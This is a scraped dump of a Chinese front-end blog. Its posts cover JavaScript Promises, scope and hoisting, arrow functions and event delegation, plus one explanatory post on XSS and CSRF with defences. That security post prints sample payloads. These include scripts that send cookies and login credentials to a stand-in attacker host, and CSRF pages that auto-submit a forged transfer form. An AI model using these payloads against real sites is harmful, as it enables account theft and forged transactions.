1234567891011121314151617181920212223242526272829303132（4）不带有任何参数:Promise.resolve方法允许调用时不带参数，直接返回一个resolved状态的 Promise 对象。const p = Promise.resolve();p.then(function () &#123; // ...&#125;);上面代码中，得到了一个 Promise 对象p。需要注意的是，立即resolve的 Promise 对象，是在本轮“事件循环”（event loop）的结束时，而不是在下一轮“事件循环”的开始时。setTimeout(function () &#123; console.log('three');&#125;, 0);Promise.resolve().then(function () &#123; console.log('two');&#125;);console.log('one');// one// two// three上面代码中，setTimeout(fn, 0)在下一轮“事件循环”开始时执行，Promise.resolve()在本轮“事件循环”结束时执行，console.log('one')则是立即执行，因此最先输出。 9、Promise.reject() Promise.reject(reason)方法会返回一个新的 Promise 实例，该实例的状态为rejected。 12345678910const p = Promise.reject('出错了');// 等同于const p = new Promise((resolve, reject) =&gt; reject('出错了'))p.then(null, function (s) &#123; console.log(s)&#125;);// 出错了上面代码生成一个 Promise 对象的实例p，状态为rejected，回调函数会立即执行 注意，Promise.reject()方法的参数会原封不动地作为reject的理由，变成后续方法的参数。这与Promise.resolve方法不一致。 1234567891011121314const thenable = &#123; then(resolve, reject) &#123; reject('出错了'); &#125;&#125;;Promise.reject(thenable).catch(e =&gt; &#123; console.log(e === thenable)&#125;)// true上面代码中，Promise.reject方法的参数是一个thenable对象，执行以后，后面catch方法的参数不是reject抛出的“出错了”这个字符串，而是thenable对象。 10、Promise.try() 开发中有时我们不知道或不想区分函数f是同步函数还是异步操作，但想用Promise来处理它。因为这样就可以不管f是否包含异步操作，都用then方法指定下一步流程，用catch方法处理f抛出的错误。一般就会采用下面的写法。 1234567891011Promise.resolve().then(f)上面的写法有一个缺点，就是如果f是同步函数，那么它会在本轮事件循环的末尾执行。const f = () =&gt; console.log('now');Promise.resolve().then(f);console.log('next');// next// now上面代码中，函数f是同步的，但是用 Promise 包装了以后，就变成异步执行了。 那么有没有方法，让同步函数同步执行，异步函数异步执行，并且让它们具有统一的 API 呢？有两种写法。 12345678910111213141516171819第一种写法是用async函数来写:const f = () =&gt; console.log('now');(async () =&gt; f())();console.log('next');// now// next上面代码中，第二行是一个立即执行的匿名函数，会立即执行里面的async函数，因此如果f是同步的，就会得到同步的结果；如果f是异步的，就可以用then指定下一步，就像下面的写法:(async () =&gt; f())().then(...)需要注意的是，async () =&gt; f()会吃掉f()抛出的错误。所以，如果想捕获错误，要使用promise.catch方法。(async () =&gt; f())().then(...).catch(...) 12345678910111213第二种写法是使用new Promise():const f = () =&gt; console.log('now');( () =&gt; new Promise( resolve =&gt; resolve(f()) ))();console.log('next');// now// next上面代码也是使用立即执行的匿名函数，执行new Promise()。这种情况下，同步函数也是同步执行的。 后来，Promise.try出现了，为所有操作提供了统一的处理机制，不管是同步还是异步，try后都可以用then方法管理流程，另外也能可以更好地管理异常。 1234567891011121314151617181920212223242526272829303132function getUsername(userId) &#123; return database.users.get(&#123;id: userId&#125;) .then(function(user) &#123; return user.name; &#125;);&#125;上面代码中，database.users.get()返回一个 Promise 对象，如果抛出异步错误，可以用catch方法捕获，就像下面这样写:database.users.get(&#123;id: userId&#125;).then(...).catch(...)但是database.users.get()可能还会抛出同步错误比如数据库连接错误，具体要看实现方法，这时你就不得不用try...catch去捕获。try &#123; database.users.get(&#123;id: userId&#125;) .then(...) .catch(...)&#125; catch (e) &#123; // ...&#125;上面这样的写法就很笨拙了，这时就可以统一用promise.catch()捕获所有同步和异步的错误。Promise.try(database.users.get(&#123;id: userId&#125;)) .then(...) .catch(...)事实上，Promise.try就是模拟try代码块，就像promise.catch模拟的是catch代码块。 11、应用 加载图片： 12345678910我们可以将图片的加载写成一个Promise，一旦加载完成，Promise的状态就发生变化:const preloadImage = function (path) &#123; return new Promise(function (resolve, reject) &#123; const image = new Image(); image.onload = resolve; image.onerror = reject; image.src = path; &#125;);&#125;; Generator 函数与 Promise 的结合: 12345678910111213141516171819202122232425262728293031323334353637使用 Generator 函数管理流程，遇到异步操作的时候，通常返回一个Promise对象:function getFoo () &#123; return new Promise(function (resolve, reject)&#123; resolve('foo'); &#125;);&#125;const g = function* () &#123; try &#123; const foo = yield getFoo(); console.log(foo); &#125; catch (e) &#123; console.log(e); &#125;&#125;;function run (generator) &#123; const it = generator(); function go(result) &#123; if (result.done) return result.value; return result.value.then(function (value) &#123; return go(it.next(value)); &#125;, function (error) &#123; return go(it.throw(error)); &#125;); &#125; go(it.next());&#125;run(g);上面代码的 Generator 函数g之中，有一个异步操作getFoo，它返回的就是一个Promise对象。函数run用来处理这个Promise对象，并调用下一个next方法。 标注： 参考资料1：http://es6.ruanyifeng.com/#docs/promise","categories":[{"name":"前端","slug":"前端","permalink":"http://liuxuewen-site.github.io/categories/前端/"}],"tags":[{"name":"前端-ES6","slug":"前端-ES6","permalink":"http://liuxuewen-site.github.io/tags/前端-ES6/"}]},{"title":"前端安全攻击","slug":"secure-bs-attack","date":"2018-03-18T12:26:58.000Z","updated":"2019-01-25T10:19:59.150Z","comments":true,"path":"2018/03/18/secure-bs-attack/","link":"","permalink":"http://liuxuewen-site.github.io/2018/03/18/secure-bs-attack/","excerpt":"","text":"一、XSS（跨站脚本攻击） 1）原理：XSS其实就是Html注入问题，攻击者的恶意代码从Html输入后，没有经过严格的控制就进入了数据库，最终显示给来访的用户，导致可以在来访用户的浏览器里，以浏览用户的身份执行代码。数据流程如下：攻击者的Html输入—&gt;web程序—&gt;进入数据库—&gt;web程序—&gt;用户浏览器。 2）原因： a、Web浏览器本身的设计不安全，浏览器能解析和执行JS等代码，但是不会判断该数据和程序代码是否恶意。 b、输入输出交互过程中没有做好安全防护，很容易会出现XSS漏洞。 c、XSS攻击手段灵活多变。 3）危害： a、盗取cookie 12345678910通过XSS攻击，由于注入代码是在受害者的浏览器上执行，因此能够很方便地窃取到受害者的Cookie信息。比如，我们只要注入类似如下的代码：&lt;script&gt;location.replace(\"http://www.attackpage.com/record.asp?secret=\"+document.cookie)&lt;/script&gt;当受害者的浏览器执行这段脚本的时候，就会自动访问攻击者建立的网站www.attackpage.com，打开其中的recourd.asp，将受害者浏览器的Cookie信息给记录下来。这样，攻击者就得到了用户的Cookie信息。得到受害者的Cookie信息后，攻击者可以很方便地冒充受害者，从而拥有其在目标服务器上的所有权限，相当于受害者的身份认证被窃取了。 b、钓鱼攻击 12345678910111213141516171819202122所谓钓鱼攻击就是构建一个钓鱼页面，诱骗受害者在其中输入一些敏感信息，然后将其发送给攻击者。利用XSS的注入脚本，我们也可以很方便地注入钓鱼页面的代码，从而引导钓鱼攻击。比如下面这样一段代码：&lt;script&gt; function hack()&#123; location.replace(\"http://www.attackpage.com/record.asp?username=\"+ document.forms[0].user.value + \"password=\" + document.forms[0].pass.value); &#125;&lt;/script&gt;&lt;form&gt; &lt;H3&gt;此功能需要登录:&lt;/H3 &gt; &lt;br&gt; 请输入用户名：&lt;br&gt; &lt;input type=”text” id=”user”name=”user”&gt; &lt;br&gt; 请输入密码： &lt;br&gt; &lt;input type=”password” name =“pass”&gt; &lt;br&gt; &lt;input type=”submit”name=”login” value=”登录”onclick=”hack()”&gt;&lt;/form&gt;注入上面的代码后，会在原来的页面上，插入一段表单，要求用户输入自己的用户名和密码，而当用户点击“登录”按钮后，则会执行hack()函数，将用户的输入发送到攻击者指定的网站上去。这样攻击者就成功窃取了该用户的账号信息。和一般的钓鱼攻击不同，XSS引导的钓鱼攻击由于是对用户信任的网站页面进行修改的。 c、CSRF攻击（见下文） 12345678比如我们注入如下的HTML代码：&lt;imgsrc = “http://www.bank.com/transfer.do?toAct=123456&amp;money=10000&gt;假如上面的代码中所访问的是某个银行网站的转账服务，则当受害者的浏览器运行这段脚本时，就会向攻击者指定的账户（示例的123456）执行转账操作。由于这个转账请求是在受害者的浏览器中运行的，因此浏览器也会自动将受害者的Cookie信息一并发送。这样，发送的请求就好像是受害者自己发送的一样，银行网站也认可这个请求的合法性，攻击者也就达到了伪造请求的目的。 d、传播恶意软件 123除了直接注入恶意脚本，通过XSS攻击，攻击者也可以很方便地在脚本中引入一些恶意软件，比如病毒、木马、蠕虫等。例如，攻击者可以在某个自己建立的页面上放置一些恶意软件，然后用XSS注入的方式，插入一段引用该页面的脚本。这样当受害者的浏览器执行这段脚本的时候，就会自动访问放置了恶意软件的页面，从而受到这些恶意软件的感染。 4）预防： a、输入过滤： 对用户的所有输入数据进行检测，比如过滤其中的“&lt;”、“&gt;”、“/”等可能导致脚本注入的特殊字符，或者过滤“script”、“javascript”等脚本关键字，或者对输入数据的长度进行限制等等。同时，我们也要考虑用户可能绕开ASCII码，使用十六进制编码来输入脚本，因此对用户输入的十六进制编码，我们也要进行相应的过滤。严格检测每一处交互点，保证对所有用户可能的输入都进行检测和XSS过滤，能够有效地阻止XSS攻击。 b、输出编码： 通过前面对XSS攻击的分析可以看到，之所以会产生XSS攻击，就是因为Web应用程序将用户的输入直接嵌入到某个页面当中，作为该页面的HTML代码的一部分。因此，当Web应用程序将用户的输入数据输出到目标页面中时，用HtmlEncoder等工具先对这些数据进行编码，然后再输出到目标页面中。这样，如果用户输入一些HTML的脚本，也会被当成普通的文字，而不会成为目标页面HTML代码的一部分得到执行。 c、Cookie防盗： 利用XSS攻击，攻击者可以很方便地窃取到合法用户的Cookie信息。因此，对于Cookie，我们可以采取以下的措施。首先，我们要尽可能地避免在Cookie中泄露隐私，如用户名、密码等；其次，我们可以将Cookie信息利用MD5等Hash算法进行多次散列后存放；再次，为了防止重放攻击，我们也可以将Cookie和IP进行绑定，这样也可以阻止攻击者冒充正常用户的身份。 二、CSRF（跨站请求伪造） 1）描述：攻击者盗用了你的身份，以你的名义发送恶意请求，对服务器来说这个请求是完全合法的，但是却完成了攻击者所期望的一个操作，比如说转账。 2）原理： 由上图分析我们可以知道构成CSRF攻击是有条件的：1、客户端必须有一个网站生成cookie凭证存储在浏览器中。2、该cookie没有清除，客户端又tab一个页面进行访问别的网站 3）危害： a、简单级别CSRF攻击 12345678910111213假设某游戏网站的虚拟币转账是采用GET方式进行操作的，样式如：http://www.game.com/Transfer.php?toUserId=11&amp;vMoney=1000此时恶意攻击者的网站也构建一个相似的链接：1、可以是采用图片隐藏，页面一打开就自动进行访问第三方文章：&lt;img src='攻击链接'&gt;2、也可以采用js进行相应的操作http://www.game.com/Transfer.php?toUserId=20&amp;vMoney=1000 #toUserID为攻击的账号ID1、假若客户端已经验证并登陆www.game.com网站，此时客户端浏览器保存了游戏网站的验证cookie2、客户端再tab另一个页面进行访问恶意攻击者的网站，并从恶意攻击者的网站构造的链接来访问游戏网站3、浏览器将会携带该游戏网站的cookie进行访问，刷一下就没了1000游戏虚拟币 b、中级别CSRF攻击 12345678910111213141516171819202122232425游戏网站负责人认识到了有被攻击的漏洞，进行升级改进，将由链接GET提交数据改成了表单提交数据//前台：提交数据表单&lt;form action=\"./Transfer.php\" method=\"POST\"&gt; &lt;p&gt;toUserId: &lt;input type=\"text\" name=\"toUserId\" /&lt;/p&gt; &lt;p&gt;vMoney: &lt;input type=\"text\" name=\"vMoney\" /&gt;&lt;/p&gt; &lt;p&gt;&lt;input type=\"submit\" value=\"Transfer\" /&gt;&lt;/p&gt;&lt;/form&gt;//后台：验证数据表单&lt;?php session_start(); if (isset($_REQUEST['toUserId'] &amp;&amp; isset($_REQUEST['vMoney'])) #验证 &#123; //相应的转账操作 &#125; ?&gt; 恶意攻击者观察网站的表单形式，并进行相应的测试， 采用（http://www.game.com/Transfer.php?toUserId=20&amp;vMoney=1000）进行测试，发现仍然可以转账， 那么此时游戏网站所做的更改没起到任何的防范作用，恶意攻击者只需要像上面那样进行攻击即可达到目的。 总结：网站开发者的错误点在于没有使用$_POST进行接收数据。当$_REQUEST可以接收POST和GET发来的数据，因此漏洞就产生了。 c、高级别CSRF攻击 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051游戏网站开发者认识到了错误，将进行下一步的改进与升级，将采用$_POST来接收数据//后台：验证数据表单&lt;?php session_start(); if (isset($_POST['toUserId'] &amp;&amp; isset($_POST['vMoney'])) #验证 &#123; //相应的转账操作 &#125; ?&gt; 此时，恶意攻击者根据游戏虚拟币转账表单进行伪造了一份一模一样的转账表单，并且嵌入到iframe中 //攻击者主页 &lt;!DOCTYPE html&gt; &lt;html&gt; &lt;head&gt; &lt;meta charset=\"utf-8\"&gt; &lt;title&gt;攻击者主机页面&lt;/title&gt; &lt;script type=\"text/javascript\"&gt; function csrf() &#123; window.frames['steal'].document.forms[0].submit(); &#125; &lt;/script&gt; &lt;/head&gt; &lt;body onload=\"csrf()\"&gt; &lt;iframe name=\"steal\" display=\"none\" src=\"./xsrf.html\"&gt; &lt;/iframe&gt; &lt;/body&gt; &lt;/html&gt; //表单页面嵌入： &lt;!DOCTYPE html&gt; &lt;html&gt; &lt;head&gt; &lt;title&gt;csrf&lt;/title&gt; &lt;/head&gt; &lt;body&gt; &lt;form display=\"none\" action=\"http://www.game.com/Transfer.php\" method=\"post\" &gt; &lt;input type=\"hidden\" name=\"toUserID\" value=\"20\"&gt; &lt;input type=\"hidden\" name=\"vMoney\" value=\"1000\"&gt; &lt;/form&gt; &lt;/body&gt; &lt;/html&gt; 客户端访问恶意攻击者的页面一样会遭受攻击 总结：CSRF攻击是源于Web的隐式身份验证机制！ Web的身份验证机制虽然可以保证一个请求是来自于某个用户的浏览器，但却无法保证该请求是用户批准发送的 4）预防： a、验证码： 验证码，强制用户必须与应用进行交互，才能完成最终请求。在通常情况下，验证码能很好遏制CSRF攻击。但是出于用户体验考虑，网站不能给所有的操作都加上验证码。因此验证码只能作为一种辅助手段，不能作为主要解决方案。 b、Token： CSRF攻击之所以能够成功，是因为攻击者利用用户未失效的cookie，发送了一些恶意请求（请求携带的信息攻击者设置），请求中所有的用户验证信息都存在于Cookie中，因此攻击者可以在不知道这些验证信息的情况下直接利用用户自己的Cookie来通过安全验证。由此可知，抵御CSRF攻击的关键在于：在请求中放入攻击者所不能伪造的信息，并且该信息不存在于Cookie之中。 所以： 1、用户访问某个表单页面时 2、服务端生成一个Token（随机，不可预测），放在用户的Session中，或者浏览器的Cookie中。【这里已经不考虑XSS攻击】 3、在页面表单附带上Token参数。 4、用户提交请求后， 服务端验证表单中的Token是否与用户Session（或Cookies）中的Token一致，一致为合法请求，不是则非法请求。 提示： 该方法需要为每个请求都带上Token参数（对于请求太多的情况，可以在每次页面加载时，使用javascript遍历整个dom树，对dom中所有的a和form标签后加入token）。一般token在用户登录时就返回给客户端存起来（localStorage）。 但是： 该方法有一个缺点是难以保证 token 本身的安全。特别是在一些论坛之类支持用户自己发表内容的网站，黑客可以在上面发布自己个人网站的地址。由于系统也会在这个地址后面加上 token，所以黑客可以在自己的网站上得到这个 token，并马上就可以发动 CSRF 攻击。为了避免这一点，系统可以在添加 token 的时候增加一个判断，如果这个链接是链到自己本站的，就在后面添加 token，如果是通向外网则不加。不过，即使这个 csrf token 不以参数的形式附加在请求之中，黑客的网站也同样可以通过 Referer 来得到这个 token 值以发动 CSRF 攻击。这也是一些用户喜欢手动关闭浏览器 Referer 功能的原因。 c、验证 HTTP Referer 字段： 在 HTTP 头中有一个字段叫 Referer，记录了该 HTTP 请求的来源地址。 在通常情况下，访问网站如：http://bank.example/withdraw?account=bob&amp;amount=1000000&amp;for=Mallory， 用户须先登陆 bank.example，然后通过点击页面上的按钮来触发转账事件。这时该转帐请求的 Referer 值就会是转账按钮所在的页面的 URL，通常是以 bank.example 域名开头的地址。而如果黑客要对银行网站实施 CSRF 攻击，他只能在他自己的网站构造请求，该请求的 Referer 是指向黑客自己的网站。 因此，要防御 CSRF 攻击，银行网站只需要对于每一个转账请求验证其 Referer 值，如果是以 bank.example 开头的域名，则说明该请求是来自银行网站自己的请求，是合法的。如果 Referer 是其他网站的话，则有可能是黑客的 CSRF 攻击，拒绝该请求。 这种方法的好处是简单易行，网站的普通开发人员不需要操心 CSRF 的漏洞，只需要在最后给所有安全敏感的请求统一增加一个拦截器来检查 Referer 的值就可以。特别是对于当前现有的系统，不需要改变当前系统的任何已有代码和逻辑，没有风险，非常便捷。 但是这种方法并非万无一失，Referer 的值是由浏览器提供的，每个浏览器对于 Referer 的具体实现可能有差别，而且不能保证浏览器自身没有安全漏洞。使用验证 Referer 值的方法就是把安全性都依赖于第三方（即浏览器）来保障，从理论上来讲，这样并不安全。事实上，对于某些浏览器，比如 IE6 或 FF2，目前已经有一些方法可以篡改 Referer 值。如果 bank.example 网站支持 IE6 浏览器，黑客完全可以把用户浏览器的 Referer 值设为以 bank.example 域名开头的地址，这样就可以通过验证，从而进行 CSRF 攻击。 即便是使用最新的浏览器，黑客无法篡改 Referer 值，这种方法仍然有问题。因为 Referer 值会记录下用户的访问来源，有些用户认为这样会侵犯到他们自己的隐私权，特别是有些组织担心 Referer 值会把组织内网中的某些信息泄露到外网中。因此，用户自己可以设置浏览器使其在发送请求时不再提供 Referer。当他们正常访问银行网站时，网站会因为请求没有 Referer 值而认为是 CSRF 攻击，拒绝合法用户的访问。 标注： 参考资料1：https://www.cnblogs.com/phpstudy2015-6/p/6771239.html 参考资料2：https://www.cnblogs.com/drawwindows/archive/2013/03/11/2954259.html","categories":[{"name":"前端","slug":"前端","permalink":"http://liuxuewen-site.github.io/categories/前端/"}],"tags":[{"name":"前端-安全性","slug":"前端-安全性","permalink":"http://liuxuewen-site.github.io/tags/前端-安全性/"}]},{"title":"作用域与作用域链","slug":"JS-bs-scope","date":"2018-03-18T07:07:31.000Z","updated":"2019-01-25T10:12:07.761Z","comments":true,"path":"2018/03/18/JS-bs-scope/","link":"","permalink":"http://liuxuewen-site.github.io/2018/03/18/JS-bs-scope/","excerpt":"","text":"一、执行环境 1在了解作用域与作用域链之前，我们先了解一下执行环境： 执行环境也叫执行上下文，它定义了变量和函数有权访问的其他数据，决定了他们各自的行为。每个执行环境都保存着与之对应的变量对象，我们无法通过代码来访问变量对象，但是解析器在处理数据时会在后台使用到它。 执行环境有全局执行环境和函数（局部）执行环境之分。执行环境是在运行和执行代码的时候才存在的，我们运行浏览器的时候会创建全局的执行环境，而在调用函数的时候，会创建函数执行环境。 1）全局执行环境 全局执行环境是最外围的一个执行环境，在web浏览器中可以认为是window对象，因此所有的全局变量和函数都是作为window对象的属性和方法创建的。代码载入浏览器时全局环境被创建，关闭网页或者关闭浏览时全局环境被销毁。 2）函数执行环境 每个函数都有自己的执行环境，当执行流进入一个函数时，函数的环境就被推入一个环境栈中，当函数执行完毕后，栈将其环境弹出，把控制权返回给之前的执行环境。 二、作用域 123456789var name1=\"haha\";function changName()&#123; var name2=\"xixi\"; console.log(name1); // haha console.log(name2); // xixi&#125; changName();console.log(name1); //hahaconsole.log(name2); //Uncaught ReferenceError: name2 is not defined 作用域就是变量和函数的可访问范围，或者说变量或函数起作用的区域。 通常我们可以将作用域分为全局作用域与局部（函数）作用域。 1）全局作用域在代码中的任何地方都能被访问到，如上例的全局变量name1，具有全局作用域所以在哪都能被访问到； 2）局部作用域一般只在固定的代码片段内可以访问得到，如上例的局部变量name2，只有在函数内部可以访问得到。 注意： 1）如果name2定义的时候，去掉了var，那么它也是属于全局变量，具有全局作用域。 2）ES6里新增了块作用域一说，块作用域的作用范围是在代码块里，通常我们可以认为是括号里面。 比如说，在for循环里面，如果我们定义var i = 0，i的作用域是局部作用域，在函数内部，for循环以外，也是可以访问到。但使用let的话，for循环里创建了块作用域，只在for循环里能访问到，for循环外是访问不到的，这样可以避免了变量污染。 三、作用域链 在JavaScript中，当调用一个函数的时候，会创建一个执行环境，并为此函数增加一个属性SCOPE,通过这个属性来指向一块内存，这块内存中包含有所有上下文的变量。当在这个函数中调用了新函数之后，新函数依然会有一个作用域来执行原来的函数的SCOPE和自己新增加的SCOPE，这样就形成了一个链式结构，这就是JavaScript中的作用域链。 作用域链的用途是保证对执行环境中有权访问的所有变量和函数的有序访问。在作用域链的最前端始终是当前执行的代码所在的环境的变量对象，作用域链的下一个变量对象来自于包含环境，再下一个变量对象又来自于下一个包含环境，一直延续到全局执行环境。全局执行环境的变量对象始终是作用域链的最后一个对象。 看一个例子： 12345678910111213141516171819var color = \"red\"; // 定义一个颜色属性 var showColor = function()&#123; // 定义显示颜色的方法 console.info(this.color);&#125; function changeColor()&#123; // 定义一个交换颜色的函数 var anotherColor = \"blue\"; function swapColor()&#123; var tempColor = anotherColor; anotherColor = color; color = tempColor; &#125; swapColor();&#125; changeColor(); // 调用交换颜色的函数来改变颜色 showColor(); // 调用显示颜色的函数来显示颜色 1）看上面的代码，首先定义了一个颜色变量color，和一个打印颜色的方法showColor()。接着定义了一个用于交换颜色的函数changeColor()。注意在这个函数中是通过另外一个函数swapColor()来实现交换的。 2）接下来，我们开始执行changeColor()函数。上面说到，js在执行函数的时候，会创建一个执行环境，并为每一个函数增加一个属性SCOPE,通过这个属性来指向一块内存，这块内存中包含有所有上下文的变量。那么，在执行changeColor()函数的时候，内存模型应该如下图所示： 图中蓝色部分是changeColor()函数的作用域链。由于changeColor()的执行上下文是window对象，所以它的作用域链的最高位指向的是全局作用域（golbal scope），在我们的程序中，目前全局作用域中有color、showColor和changeColor这3个属性。changeColor()作用域链的低位指向的是它自己的作用域，在changeColor()中，有anotherColor和swapColor2个属性。 3）执行changeColor()函数时，在函数内部又创建了一个swapColor()函数，创建之后立刻执行这个函数。此时的作用域链内存模型如下图所示： 同样，swapColor的作用域链的最顶端指向的是全局作用域，下一级指向的是包含它的changeColor函数的作用域，最后才是指向自己的作用域。 4）接着，swapColor函数开始执行，第一代码是var tempColor = anotherColor，它首先会在自己的作用域中查找是否有tempColor属性，根据上面的图我们可以看到，在swapColor的作用域中存在tempColor属性，于是它把tempColor的值由“red”修改为“blue”。 第二句代码是anotherColor = color，首先它也是先在swapColor的作用域中查找anotherColor属性，发现没有找到，它就会通过作用域链到上一级的changeColor作用域中去查找，找到之后将anotherColor属性由“blue”修改为“red”。 第三句代码是color = tempColor，属性查找的方法相同，首先在自己的作用域中查找，没有找到的话到上一级的作用域去查找。最终会在全局作用域中找到color属性，于是它将全局作用域中的color属性由“red”修改为“blue”。 5）最后，swapColor函数执行完毕之后，函数会被垃圾回收，同时changeColor函数也执行完毕，同样被垃圾回收。紧接着我们调用了showColor()方法，此时又会为该函数创建新的执行环境和作用域链。 在showColor的作用域链中有2个指向：顶层的全局作用域和它自己的作用域。在执行showColor函数的时候，它在自己的作用域中没有发现color属性，于是到上一级的全局作用域中查找，此时全局作用域中的color属性已经被修改为“blue”，所以程序最终会打印出的颜色是“blue”。 四、提升 提升有变量提升和函数提升之分，看下面： 1）变量提升：把变量提升到函数的顶部 12345678910var name=\"haha\";function changeName()&#123; console.log(name); var name=\"xixi\";&#125;changeName(); //undefined console.log(name); //haha 看这段代码，为什么changeName()结果会是undefined，按理说应该是haha或者xixi呀，接着看： 先来分析一下代码，函数changeName()的作用域链：自己的变量对象 –&gt; 全局变量对象。解析器在函数执行环境中发现变量name，因此不会再向全局环境的变量对象中寻找。但是大家要注意的是，解析器在解析第3句代码时，还不知道变量name的值，也就是说只知道有变量name，但是不知道它具体的值（因为还没有执行第4句代码），因此输出是undefined，第7行输出haha大家应该都理解把（作用域问题）。所以上述代码可以写成下面的形式： 1234567891011var name=\"haha\";function changeName()&#123; var name; console.log(name); name=\"xixi\";&#125;changeName();console.log(name); 这个现象就是变量提升！变量提升，就是把变量提升到函数的顶部，需要注意的是，变量提升只是提升变量的声明，不会把变量的值也提升上来！ 2）函数提升：把函数提升到前面 在JavaScript中函数的创建方式有三种：函数声明、函数表达式、函数构造法。 123456789101112//函数表达式var func1 = function(n1,n2)&#123; //function body;&#125;;//函数构造法var func2 = new Function(\"para1\",\"para2\",...,\"function body\"); //函数声明function func3()&#123; //function body;&#125; 在这里需要说明的是：只有函数声明形式才能被提升！例如： 1234567891011121314151617//函数声明function myTest1()&#123; func(); function func()&#123; console.log(\"我可以被提升\"); &#125; &#125; myTest1(); //我可以被提升//函数表达式function myTest2()&#123; func(); var func = function()&#123; console.log(\"我不能被提升\"); &#125; &#125; myTest2(); //出错object expected 标注： 参考资料1：https://www.cnblogs.com/buchongming/p/5858026.html 参考资料2：http://www.htmleaf.com/ziliaoku/qianduanjiaocheng/201512242948.html","categories":[{"name":"前端","slug":"前端","permalink":"http://liuxuewen-site.github.io/categories/前端/"}],"tags":[{"name":"前端-JS","slug":"前端-JS","permalink":"http://liuxuewen-site.github.io/tags/前端-JS/"}]},{"title":"箭头函数与普通函数","slug":"JS-bs-arrow","date":"2018-03-16T10:51:42.000Z","updated":"2019-01-25T10:06:06.726Z","comments":true,"path":"2018/03/16/JS-bs-arrow/","link":"","permalink":"http://liuxuewen-site.github.io/2018/03/16/JS-bs-arrow/","excerpt":"","text":"一、箭头函数与普通函数 首先我们先看一下箭头函数与普通函数： 123456789//箭头函数var a = ()=&gt;&#123; //函数名、参数、结果 return 1;&#125;//普通函数function a()&#123; return 1;&#125; 接着我们看一下他们间的比较： 1）简洁： 1234567//function定义函数function aaa(a,b)&#123; return a+b;&#125;///箭头函数定义函数var aaa=(a,b)=&gt;&#123;return a+b;&#125; 2）this指向： 12345678910111213141516171819202122232425262728293031323334353637普通函数中，this指向随着调用环境的改变而改变，指向调用它的对象；箭头函数中的指向则是固定不变，一直指向定义环境的（其实箭头函数没有它们自己的this，里面的this来自闭包所在的作用域）。var obj = &#123; a: 10, b: function() &#123; console.log(this.a); //10 console.log(this); //obj&#123;...&#125; &#125; c: () =&gt; &#123; console.log(this.a); //undefined console.log(this); //window &#125;, &#125; obj.b(); obj.c();此处中，c是一个箭头函数，这个函数捕获的是obj&#123;&#125;这个对象的环境，然而这个环境的this指向的是window，所以this是指向window。var obj = &#123; a: 10, b: function()&#123; console.log(this.a); &#125;, c: function() &#123; return ()=&gt;&#123; console.log(this.a); &#125; &#125; &#125; obj.b(); //10 obj.c()(); //10此处中，return的箭头函数的this捕获的是c:function()&#123;&#125;这个环境的this，而这个环境的this是obj，所以this是指向obj。 3）new使用： 12345678普通函数，可以作为构造函数使用new；箭头函数作为匿名函数,是不能作为构造函数的,不能使用newvar B = ()=&gt;&#123; value:1;&#125;var b = new B(); //TypeError: B is not a constructor 4）原型属性： 12345678910111213普通函数有着原型属性；箭头函数没有原型属性var a = ()=&gt;&#123; return 1;&#125;function b()&#123; return 2;&#125;console.log(a.prototype); //undefinedconsole.log(b.prototype); //object&#123;...&#125; 5）call()和apply()： 123456789101112131415161718普通函数可以通过call() 或 apply()改变this指向；箭头函数使用时只是传入了参数而已，对this并没有什么影响var obj = &#123; a: 10, b: function(n)&#123; var f = (v) =&gt; v + this.a; return f(n); &#125;, c: function(n) &#123; var f = (v) =&gt; v + this.a; var m = &#123;a:20&#125;; return f.call(m,n); &#125;&#125;console.log(obj.b(1)); //11console.log(obj.c(1)); //11 6）arguments使用： 1234567891011121314151617普通函数可以通过arguments获取函数参数；箭头函数不绑定arguments,取而代之用rest参数…解决function A(a)&#123; console.log(arguments); &#125;A(1); //[object Arguments] &#123;0: 1&#125;var B = (b)=&gt;&#123; console.log(arguments); &#125;B(2); //ReferenceError: arguments is not definedvar C = (...c)=&gt;&#123; //...c即为rest参数 console.log(c); &#125;C(3); //[3] 二、箭头函数的优缺点 箭头函数最大的优点就是简洁，其他的跟普通函数的区别，不能说它是优点还是缺点，只是在不同场合下各适其景罢了。 然而，我们不能滥用箭头函数，因为： 1）箭头函数适合于无复杂逻辑或者无副作用的纯函数场景下，例如用在map、reduce、filter的回调函数定义中；在有多层函数嵌套的情况下，箭头函数的简洁性并没有很大的提升，反而影响了函数的作用范围的识别度，这种情况不建议使用箭头函数。 2）不要在最外层定义箭头函数，因为在函数内部操作this会很容易污染全局作用域。最起码在箭头函数外部包一层普通函数，将this控制在可见的范围内； 三、匿名函数 在JavaScript中，函数的定义大致可以分为三种： 12345678910//函数表达式function double(x)&#123; return 2 * x; &#125;//函数构造法var double = new Function(&apos;x&apos;, &apos;return 2 * x;&apos;);//函数声明var double = function(x) &#123; return 2* x; &#125; 匿名函数，顾名思义就是没有函数名的函数，其表示方法有两种: 12345678910111213141）第一种如上面第三种函数定义：var double = function(x) &#123; return 2* x; &#125;等号右边的函数就是一个匿名函数，创造完毕函数后，又将该函数赋给了变量double。2）第二种如：```bash(function(x, y)&#123; alert(x + y); &#125;)(2, 3);这里创建了一个匿名函数(在第一个括号内)，第二个括号用于调用该匿名函数，并传入参数。 匿名函数的作用有： 1）定义在匿名函数里面的变量与外边隔离，创建了临时的命名空间，防止全局变量污染 2）避免函数名的冲突 标注： 参考资料1：https://www.jianshu.com/p/73cbeb6782a0 参考资料2：https://cnodejs.org/topic/584a207a3ebad99b336b1ede","categories":[{"name":"前端","slug":"前端","permalink":"http://liuxuewen-site.github.io/categories/前端/"}],"tags":[{"name":"前端-JS","slug":"前端-JS","permalink":"http://liuxuewen-site.github.io/tags/前端-JS/"}]},{"title":"事件代理（事件委托）","slug":"JS-bs-entrust","date":"2018-03-16T05:04:41.000Z","updated":"2019-01-25T10:10:32.459Z","comments":true,"path":"2018/03/16/JS-bs-entrust/","link":"","permalink":"http://liuxuewen-site.github.io/2018/03/16/JS-bs-entrust/","excerpt":"","text":"一、事件代理 1）描述： 事件代理也叫事件委托，就是使用事件冒泡机制，一个元素将监听事件的请求委托给其他的元素。 最常见的就是子元素将监听事件挂在到父元素上，然后当点击子元素的时候，由于事件冒泡，最终会在父元素上触发监听函数，然后执行子元素的回调函数，这样做的好处是可以避免在每个子元素上都去挂载监听事件，坏处是有些事件没有冒泡机制，如focus、blur，就无法使用事件委托的方式，还有像mousemove、mouseout只能通过位置去计算定位，性能消耗太大，不适宜使用事件委托。 2）优点： 